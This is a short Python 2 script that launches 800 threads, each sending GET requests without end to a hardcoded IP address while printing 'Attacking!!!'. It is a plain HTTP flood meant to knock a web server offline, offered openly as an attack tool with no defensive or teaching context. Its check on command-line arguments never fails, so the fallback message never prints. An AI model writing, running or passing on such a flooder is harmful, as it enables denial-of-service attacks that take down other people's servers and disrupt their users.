import threading
import urllib3
import sys
http = urllib3.PoolManager()
thread_num=800
def run():
    if len(sys.argv)>=1:
        print "Attacking!!!"
        while True:
            r = http.request('GET','http://69.162.108.171')
    else:
        print "It only work on HTTP server!!!"

for i in range(thread_num):
    th = threading.Thread(target = run)
    th.start()

